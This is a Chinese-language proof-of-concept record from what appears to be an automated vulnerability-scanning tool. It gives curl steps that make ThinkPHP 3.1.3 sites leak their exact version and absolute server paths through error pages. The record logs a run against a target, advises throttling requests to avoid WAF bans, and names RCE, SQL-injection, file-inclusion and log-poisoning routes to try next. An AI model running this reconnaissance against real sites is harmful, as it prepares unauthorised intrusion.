# ThinkPHP 精确版本与绝对路径识别（异常页法）

- **code**: thinkphp-精确版本与绝对路径识别-异常页法
- **kind**: script
- **category**: info-leak
- **component**: ThinkPHP 3.1.3
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 在靶标 example.com（源站 203.0.113.94）实测成功：curl "https://example.com/User" 返回 200，页面回显 模板不存在[/www/wwwroot/thisthbweb_com/App/Tpl/Home/User_example.com] 且页脚为 ThinkPHP 3.1.3；同法在 /example.com?g=Home&m=Pay&a=index 回显 Pay_example.com，证实方法可复用。响应头 X-Powered-By: ThinkPHP 亦确认。
- **path**: pocs/thinkphp-精确版本与绝对路径识别-异常页法/poc.sh
- **tags**: thinkphp,fingerprint,info-leak,路径泄露,版本识别
- **created_at**: 2026-09-26T08:51:07.003Z
- **found_by**: vuln-scan

## 描述

通过异常页/响应头零风险识别 ThinkPHP 精确版本（3.x 走 g=/m=/a= 路由）并顺带获取服务器绝对路径与模板目录结构，为 Nday 定位与文件包含 payload 构造提供依据。

## 用法

```
替换 <target> 为实际目标域名或 URL；三步按顺序执行，第 3 步命中率最高。
注意：若目标有 WAF/防 CC，禁止并发跑（本目标即因 10 线程枚举被 Connection reset 封禁）。单线程、每次间隔 1s 以上。
```

## 正文

```
## 识别方法（三步，零风险、纯被动）

### 1. 响应头初筛
```
curl -sS -k -i "https://<target>/"
```
命中特征头：`X-Powered-By: ThinkPHP`、`Server: Nginx`；并可能伴随第三方 CDN 私有头。
ThinkPHP 3.x 的 Set-Cookie 只有 `PHPSESSID`，无框架专属 cookie。

### 2. 路由格式判定（3.x vs 5.x 的关键区分）
ThinkPHP **3.x** 使用 `g=`/`m=`/`a=` 三元组：
```
/example.com?g=Home&m=Index&a=login          # 模块=Home 控制器=Index 方法=login
/example.com?g=Home&m=Pay&a=pay
```
ThinkPHP **5.x/6.x** 使用 `/example.com/<module>/<controller>/<action>` 或 `?s=/a/b/c`。
若站点同时支持 `PATH_INFO`（`/Index/login` 直接可访问），说明配置了 url_rewrite。

### 3. 异常页取精确版本 + 绝对路径（最有效）
请求一个控制器下的**不存在模板/方法**，触发模板不存在异常：
```
curl -sS -k "https://<target>/User"          # 模块/控制器存在但无模板
curl -sS -k "https://<target>/example.com?g=Home&m=Pay&a=index"
```
返回体特征：
```html
<title>系统发生错误</title>
<h1>模板不存在[/www/wwwroot/<项目名>/App/Tpl/Home/User_example.com]</h1>
<p><a title="官方网站" href="http://www.thinkphp.cn">ThinkPHP</a><sup>3.1.3</sup>
{ Fast & Simple OOP PHP Framework } -- [ WE CAN DO IT JUST THINK ]</p>
```
一次命中同时得到三样东西：**精确版本 3.1.3**、**服务器绝对路径**（含宝塔面板标准目录 `/www/wwwroot/`）、**模板目录结构**（`App/Tpl/<模块>/<控制器>_<方法>.html`）。

## 指纹库落库值
| 字段 | 值 |
| --- | --- |
| category | 框架 |
| product | ThinkPHP |
| version | 3.1.3 |
| evidence | `X-Powered-By: ThinkPHP`；异常页 footer `ThinkPHP 3.1.3`；模板路径 `App/Tpl/Home/*.html` |

## 该版本对应的已知高危面（拿到版本后即应逐条验证）
- ThinkPHP 3.x 缓存文件包含 / 模板渲染类 RCE（`display()` + 可控模板变量、`__APP__` 常量替换）
- ThinkPHP 3.x `where()` 数组 / `exp` 表达式 SQL 注入（`logic`/`where` 参数传入数组）
- ThinkPHP 3.1.3 多语言 `l=` 参数与 `s=` 参数解析缺陷
> 注意：本方法只确认版本与路径，**不确认漏洞存在**。必须在目标上实测回显才能记为 confirmed。

## 附加价值
- 异常页泄露的绝对路径可直接用于：文件包含 payload 构造、日志投毒路径、`/www/wwwroot/` 宝塔站点定位。
- 若站点开启 debug，同类请求会输出完整调用栈与 SQL，价值更高。

```
